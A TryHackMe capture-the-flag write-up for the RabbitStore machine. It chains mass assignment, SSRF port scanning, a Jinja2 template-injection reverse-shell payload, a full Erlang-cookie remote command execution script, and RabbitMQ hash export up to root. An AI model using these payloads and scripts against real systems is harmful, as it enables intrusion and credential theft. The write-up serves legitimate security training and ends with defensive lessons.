# TryHackMe: RabbitStore Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Category](https://img.shields.io/badge/Category-Penetration%20Testing-green)

A complete walkthrough of the **RabbitStore** machine on TryHackMe. This writeup documents the reconnaissance, subdomain discovery, mass assignment and server-side request forgery in a cloud storage application, server-side template injection, Erlang cookie abuse against RabbitMQ, and privilege escalation to root.

---

## Table of Contents

- [Overview](#overview)
- [Environment](#environment)
- [Attack Summary](#attack-summary)
- [1. Reconnaissance](#1-reconnaissance)
- [2. Subdomain Enumeration](#2-subdomain-enumeration)
- [3. Account Registration and Authorization Bypass](#3-account-registration-and-authorization-bypass)
- [4. Server-Side Request Forgery](#4-server-side-request-forgery)
- [5. Internal Service Discovery](#5-internal-service-discovery)
- [6. Server-Side Template Injection](#6-server-side-template-injection)
- [7. Initial Access](#7-initial-access)
- [8. Erlang Cookie Abuse and RabbitMQ Access](#8-erlang-cookie-abuse-and-rabbitmq-access)
- [9. Credential Recovery](#9-credential-recovery)
- [10. Privilege Escalation](#10-privilege-escalation)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

| Field        | Value                                   |
|--------------|-----------------------------------------|
| Machine      | RabbitStore                             |
| Platform     | TryHackMe                               |
| Difficulty   | Medium                                  |
| Target IP    | `10.48.156.119`                         |
| OS           | Ubuntu Linux                            |
| Services     | Apache 2.4.52, RabbitMQ 3.9.13, OpenSSH 8.9p1 |
| Objective    | Obtain `user.txt` and `root.txt`        |

---

## Environment

| Component         | Details                                   |
|-------------------|-------------------------------------------|
| Attacker Machine  | Kali Linux                                |
| Attacker IP       | `192.168.136.156`                         |
| Target            | `10.48.156.119`                           |
| Virtual Hosts     | `cloudsite.thm`, `storage.cloudsite.thm`  |

---

## Attack Summary

The attack chain progresses through the following stages:

1. **Port scanning** revealed SSH, HTTP, and two Erlang-related services used by RabbitMQ.
2. **Subdomain enumeration** discovered a storage subdomain, `storage.cloudsite.thm`.
3. **Mass assignment** during account registration allowed a self-registered user to activate their own subscription.
4. **Server-side request forgery** through the URL upload feature confirmed outbound requests from the server.
5. **Internal port scanning** via the SSRF identified an internal service on port 3000.
6. **Server-side template injection** in the chatbot endpoint provided remote code execution as `azrael`.
7. **Erlang cookie exposure** was abused to execute commands through the RabbitMQ distribution port, yielding a shell as `rabbitmq`.
8. **Administrative RabbitMQ user creation** and definition export exposed the password hash of the `root` account.
9. **Credential recovery and privilege escalation** resulted in a root shell.

---

## 1. Reconnaissance

### 1.1 Full TCP Port Scan

```bash
nmap -p- -v 10.48.156.119
```

**Results:**

| Port  | State | Service | Notes                              |
|-------|-------|---------|------------------------------------|
| 22    | open  | ssh     | OpenSSH 8.9p1 (Ubuntu)             |
| 80    | open  | http    | Apache 2.4.52                      |
| 4369  | open  | epmd    | Erlang Port Mapper Daemon          |
| 25672 | open  | unknown | Erlang distribution port (RabbitMQ)|

### 1.2 Service and Version Detection

```bash
nmap -sC -sV -p 22,80,4369,25672 10.48.156.119
```

Key findings:

- **HTTP (80):** Redirects to `http://cloudsite.thm/`, so the hostname was added to the local hosts file.
- **EPMD (4369):** Reports a RabbitMQ node named `rabbit` listening on port 25672.
- **Erlang distribution (25672):** Exposed and accessible if the correct Erlang cookie is known.

```bash
echo "10.48.156.119 cloudsite.thm" | sudo tee -a /etc/hosts
```

---

## 2. Subdomain Enumeration

Virtual host fuzzing was performed against the main domain to identify additional sites.

```bash
ffuf -u http://cloudsite.thm/ \
     -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
     -H "Host: FUZZ.cloudsite.thm" -ac -s
```

```
storage
```

The subdomain `storage.cloudsite.thm` was added to the hosts file:

```bash
echo "10.48.156.119 storage.cloudsite.thm" | sudo tee -a /etc/hosts
```

---

## 3. Account Registration and Authorization Bypass

### 3.1 Registering a Standard Account

A new account was registered through the storage application. After logging in, the dashboard showed that uploads were restricted for inactive users, and an active subscription was required.

### 3.2 Mass Assignment in the Registration Request

The registration request was captured in Burp Suite and modified to include an additional `subscription` field that the application did not expect from the client:

```json
{
  "email": "test@test.thm",
  "password": "hello",
  "subscription": "active"
}
```

The server accepted the field, and logging in with the new account provided access to the active dashboard. This is a classic mass assignment weakness, in which the server binds user-supplied data directly to a model without restricting which fields can be set.

---

## 4. Server-Side Request Forgery

### 4.1 Confirming Outbound Requests

The active dashboard offers two upload options: from the local computer or from a URL. The URL option was tested with a listener on the attacker machine:

```bash
python3 -m http.server 80
```

```
10.48.156.119 - - "GET /test.jpg HTTP/1.1" 404 -
```

The incoming request confirmed that the server fetches remote content on behalf of the user, which is a server-side request forgery (SSRF) condition.

### 4.2 Attempting a Direct Shell Upload

A PHP reverse shell (Pentest Monkey) was hosted on the attacker machine and submitted through the URL option. The server returned a file path under `/api/uploads/`, but the file was not executed as PHP, so this approach was abandoned in favour of using the SSRF to reach internal services.

---

## 5. Internal Service Discovery

A script was written to abuse the `/api/store-url` endpoint, which fetches a supplied URL and returns a path if the request succeeds. By requesting `http://127.0.0.1:<port>` for every TCP port, the script identified services reachable only from the server's loopback interface.

```python
import requests

base_url = "http://storage.cloudsite.thm/api/store-url"
headers = {
    "Cookie": "jwt=<session-token>",
    "Content-Type": "application/json"
}

def make_request(port):
    test_url = f"http://127.0.0.1:{port}"
    data = {"url": test_url}
    try:
        response = requests.post(base_url, headers=headers, json=data)
        if response.status_code == 200:
            json_response = response.json()
            if "path" in json_response and json_response["path"]:
                print(f"Port: {port}, Path: {json_response['path']}")
    except requests.RequestException as e:
        print(f"Error on port {port}: {e}")

for port in range(1, 65536):
    make_request(port)
```

The scan identified an internal service on **port 3000**. Its stored response was retrieved through the same SSRF:

```
Endpoints Perfectly Completed

POST Requests:
/api/register                       - For registering user
/api/login                          - For logging in the user
/api/upload                         - For uploading files
/api/store-url                      - For uploading files via URL
/api/fetch_messeges_from_chatbot    - Chatbot endpoint (under development)

GET Requests:
/api/uploads/filename               - To view the uploaded files
/dashboard/inactive                 - Dashboard for inactive user
/dashboard/active                   - Dashboard for active user
```

This disclosed an internal API documentation page, which listed the chatbot endpoint as the next target.

---

## 6. Server-Side Template Injection

### 6.1 Identifying the Chatbot Endpoint

The endpoint `/api/fetch_messeges_from_chatbot` rejected `GET` requests. When tested with `POST`, a valid token and a `username` field returned a `200 OK` response. The response reflected the username into an HTML page:

```html
<h1>Sorry, nk, our chatbot server is currently under development.</h1>
```

Reflection of user input into a server-rendered template suggested a template injection vulnerability.

### 6.2 Confirming SSTI and Obtaining Code Execution

A Jinja2-style expression was supplied in the `username` field. Expressions of this form reach Python's `os` module through the template's global objects, and the payload executed a reverse shell back to the attacker machine. The payload used a base64-encoded command to avoid special-character issues in the request.

```
{{request.application.__globals__.__builtins__.__import__('os').popen('<base64-encoded reverse shell>|base64 -d|bash').read()}}
```

A listener was started on the attacker machine:

```bash
nc -lvnp 5555
```

```
connect to [192.168.136.156] from (UNKNOWN) [10.48.156.119] 40620
azrael@forge:~/chatbotServer$
```

---

## 7. Initial Access

### 7.1 Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background the listener
stty raw -echo
fg
export TERM=xterm-256color
```

### 7.2 User Flag

```bash
cd ~
ls
# chatbotServer  snap  user.txt
cat user.txt
```

---

## 8. Erlang Cookie Abuse and RabbitMQ Access

### 8.1 Locating the Erlang Cookie

The RabbitMQ data directory was inspected as `azrael`:

```bash
ls -lah /var/lib/rabbitmq
```

```
-r-----r--  1 rabbitmq rabbitmq   16 Nov 11 02:27 .erlang.cookie
```

The cookie file was readable by the current user, which exposed the shared secret used to authenticate Erlang nodes.

```bash
cat /var/lib/rabbitmq/.erlang.cookie
```

### 8.2 Authenticating to the Erlang Distribution Port

An Erlang distribution command-execution script (`enum.py`, based on publicly available proof-of-concept code) was used with the recovered cookie. The script performs the Erlang handshake using the cookie, then sends an RPC call that runs a shell command on the node. It requires the `erlang` Python module that it imports.

```python
#!/usr/bin/env python2

from struct import pack, unpack
from cStringIO import StringIO
from socket import socket, AF_INET, SOCK_STREAM, SHUT_RDWR
from hashlib import md5
from binascii import hexlify, unhexlify
from random import choice
from string import ascii_uppercase
import sys
import argparse
import erlang as erl


def rand_id(n=6):
    return ''.join([choice(ascii_uppercase) for c in range(n)]) + '@nowhere'


parser = argparse.ArgumentParser(description='Execute shell command through Erlang distribution protocol')

parser.add_argument('target', action='store', type=str, help='Erlang node address or FQDN')
parser.add_argument('port', action='store', type=int, help='Erlang node TCP port')
parser.add_argument('cookie', action='store', type=str, help='Erlang cookie')
parser.add_argument('--verbose', action='store_true', help='Output decode Erlang binary term format received')
parser.add_argument('--challenge', type=int, default=0, help='Set client challenge value')
parser.add_argument('cmd', default=None, nargs='?', action='store', type=str, help='Shell command to execute, defaults to interactive shell')

args = parser.parse_args()

name = rand_id()

sock = socket(AF_INET, SOCK_STREAM, 0)
assert(sock)

sock.connect((args.target, args.port))


def send_name(name):
    FLAGS = (
        0x7499c +
        0x01000600  # HANDSHAKE_23|BIT_BINARIES|EXPORT_PTR_TAG
    )
    return pack('!HcQIH', 15 + len(name), 'N', FLAGS, 0xdeadbeef, len(name)) + name


sock.sendall(send_name(name))

data = sock.recv(5)
assert(data == '\x00\x03\x73\x6f\x6b')

data = sock.recv(4096)
(length, tag, flags, challenge, creation, nlen) = unpack('!HcQIIH', data[:21])
assert(tag == 'N')
assert(nlen + 19 == length)
challenge = '%u' % challenge


def send_challenge_reply(cookie, challenge):
    m = md5()
    m.update(cookie)
    m.update(challenge)
    response = m.digest()
    return pack('!HcI', len(response) + 5, 'r', args.challenge) + response


sock.sendall(send_challenge_reply(args.cookie, challenge))

data = sock.recv(3)
if len(data) == 0:
    print('wrong cookie, auth unsuccessful')
    sys.exit(1)
else:
    assert(data == '\x00\x11\x61')
    digest = sock.recv(16)
    assert(len(digest) == 16)

print('[*] authenticated onto victim')


# Protocol between connected nodes is based on pre 5.7.2 format
def erl_dist_recv(f):
    hdr = f.recv(4)
    if len(hdr) != 4:
        return

    (length,) = unpack('!I', hdr)
    data = f.recv(length)
    if len(data) != length:
        return

    # Remove 0x70 from the head of the stream
    data = data[1:]

    print("Received data to parse: %s" % data)

    while data:
        try:
            (parsed, term) = erl.binary_to_term(data)
            if parsed <= 0:
                print('Failed to parse Erlang term, raw data: %s' % data)
                break
        except erl.ParseException as e:
            print('ParseException occurred: %s. Data: %s' % (str(e), data))
            break

        print("Parsed term: %s" % str(term))

        yield term
        data = data[parsed:]


def encode_string(name, type=0x64):
    return pack('!BH', type, len(name)) + name


def send_cmd_old(name, cmd):
    data = (
        unhexlify('70836804610667') +
        encode_string(name) +
        unhexlify('0000000300000000006400006400037265') +
        unhexlify('7883680267') +
        encode_string(name) +
        unhexlify('0000000300000000006805') +
        encode_string('call') +
        encode_string('os') +
        encode_string('cmd') +
        unhexlify('6c00000001') +
        encode_string(cmd, 0x6b) +
        unhexlify('6a') +
        encode_string('user')
    )

    return pack('!I', len(data)) + data


def send_cmd(name, cmd):
    # REG_SEND control message
    ctrl_msg = (
        6,
        erl.OtpErlangPid(
            erl.OtpErlangAtom(name),
            '\x00\x00\x00\x03',
            '\x00\x00\x00\x00',
            '\x00'
        ),
        erl.OtpErlangAtom(''),
        erl.OtpErlangAtom('rex')
    )

    msg = (
        erl.OtpErlangPid(
            erl.OtpErlangAtom(name),
            '\x00\x00\x00\x03',
            '\x00\x00\x00\x00',
            '\x00'
        ),
        (
            erl.OtpErlangAtom('call'),
            erl.OtpErlangAtom('os'),
            erl.OtpErlangAtom('cmd'),
            [cmd],
            erl.OtpErlangAtom('user')
        )
    )

    new_data = '\x70' + erl.term_to_binary(ctrl_msg) + erl.term_to_binary(msg)

    print("Sending command data: %s" % new_data)

    return pack('!I', len(new_data)) + new_data


def recv_reply(f):
    terms = [t for t in erl_dist_recv(f)]

    if args.verbose:
        print('\nReceived terms: %r' % (terms))

    if len(terms) < 2:
        print("Error: Unexpected number of terms received")
        return None

    answer = terms[1]
    if len(answer) != 2:
        print("Error: Unexpected structure in answer")
        return None

    return answer[1]


if not args.cmd:
    while True:
        try:
            cmd = raw_input('%s:%d $ ' % (args.target, args.port))
        except EOFError:
            print('')
            break

        sock.sendall(send_cmd(name, cmd))

        reply = recv_reply(sock)
        if reply:
            sys.stdout.write(reply)
        else:
            print("Failed to receive a valid reply")

else:
    sock.sendall(send_cmd(name, args.cmd))

    reply = recv_reply(sock)
    if reply:
        sys.stdout.write(reply)
    else:
        print("Failed to receive a valid reply")


print('[*] disconnecting from victim')
sock.close()
```

```bash
python2 enum.py cloudsite.thm 25672 <erlang-cookie>
```

```
[*] authenticated onto victim
cloudsite.thm:25672 $
```

### 8.3 Reverse Shell as rabbitmq

The script was used to run a base64-decoded reverse shell as the `rabbitmq` user:

```bash
python2 enum.py cloudsite.thm 25672 <erlang-cookie> '<base64-encoded reverse shell> | base64 -d | bash'
```

```bash
nc -lvnp 4444
```

```
connect to [192.168.136.156] from (UNKNOWN) [10.48.156.119] 47010
rabbitmq@forge:~$
```

---

## 9. Credential Recovery

### 9.1 Creating an Administrative RabbitMQ User

With access as the `rabbitmq` user, a new administrator account was created and granted full permissions:

```bash
rabbitmqctl add_user naval naval
rabbitmqctl set_permissions -p / naval ".*" ".*" ".*"
rabbitmqctl set_user_tags naval administrator
```

### 9.2 Exporting the Definitions

The broker configuration, including all user password hashes, was exported with the new account:

```bash
rabbitmqadmin export rabbit.definitions.json -u naval -p naval
cat rabbit.definitions.json
```

The export contained the hash for the `root` account, along with a note embedded in the file that discouraged attempts to crack the SHA-256 value. The note was not treated as a barrier, because the hash scheme and its encoding can be decoded and analysed.

```json
{
  "name": "root",
  "password_hash": "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF",
  "hashing_algorithm": "rabbit_password_hashing_sha256",
  "tags": ["administrator"]
}
```

### 9.3 Decoding the Password Hash

RabbitMQ stores password hashes as a base64-encoded value in which the first four bytes are a salt and the remaining bytes are the SHA-256 digest of the salt concatenated with the password. Decoding the value splits it into its components:

```python
import hashlib
import binascii

hash = '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF'

def decode_rabbit_password_hash(password_hash):
    password_hash = binascii.a2b_base64(password_hash)
    decoded_hash = password_hash.hex()
    return decoded_hash[0:8], decoded_hash[8:]

print(decode_rabbit_password_hash(hash))
```

The decoded salt and digest were then used to recover the plaintext password for `root`.

> The recovered password is not reproduced in this public writeup.

---

## 10. Privilege Escalation

With the recovered password, the `root` account was accessed from the `rabbitmq` shell:

```bash
su root
Password: <recovered-password>
```

```
root@forge:/var/lib/rabbitmq# id
uid=0(root) gid=0(root) groups=0(root)
```

### 10.1 Root Flag

```bash
cat /root/root.txt
```

---

## Flags

| Flag        | Location                  | Value         |
|-------------|---------------------------|---------------|
| `user.txt`  | `/home/azrael/user.txt`   | `<user-flag>` |
| `root.txt`  | `/root/root.txt`          | `<root-flag>` |

> Flag values are intentionally omitted from this public writeup in accordance with TryHackMe guidelines.

---

## Lessons Learned

- **Never bind client-supplied data directly to model fields.** The `subscription` field should have been ignored or rejected during registration.
- **Validate and restrict outbound requests.** The URL upload feature allowed the server to reach internal services on loopback addresses, enabling port scanning and access to internal APIs.
- **Do not render user input inside server-side templates.** Reflecting the `username` value into a template turned a chatbot endpoint into a code execution vector.
- **Protect Erlang cookies strictly.** The cookie grants full control over any node that shares it, so it must be readable only by the owning service account.
- **Restrict RabbitMQ administrative capabilities.** Clustering ports should not be exposed beyond what is required, and administrative users should not be creatable from a compromised service account.
- **Do not expose password hashes through configuration exports.** Definition files should be stored with restricted permissions and sanitised before being shared or retained.
- **Avoid password reuse for system and service accounts.** The recovered RabbitMQ password granted direct access to the system `root` account.

---

## Tools Used

| Tool              | Purpose                                              |
|-------------------|------------------------------------------------------|
| Nmap              | Port scanning and service fingerprinting             |
| ffuf              | Virtual host enumeration                             |
| Burp Suite        | Intercepting and modifying registration requests     |
| Python HTTP Server| Hosting payloads and confirming outbound requests    |
| Custom Python     | Internal port scanning through SSRF                  |
| Netcat            | Reverse shell listeners                              |
| enum.py           | Erlang distribution command execution                |
| rabbitmqctl       | Managing RabbitMQ users and permissions              |
| rabbitmqadmin     | Exporting broker definitions                         |

---

## References

- [TryHackMe: RabbitStore](https://tryhackme.com/)
- [OWASP: Mass Assignment](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP: Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger: Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [RabbitMQ Documentation](https://www.rabbitmq.com/docs)

---

## Disclaimer

This writeup is intended solely for educational purposes and was performed in a legal, authorized lab environment provided by TryHackMe. The techniques described should only be used against systems where you have explicit written permission to test.

# Jai Shri Ram
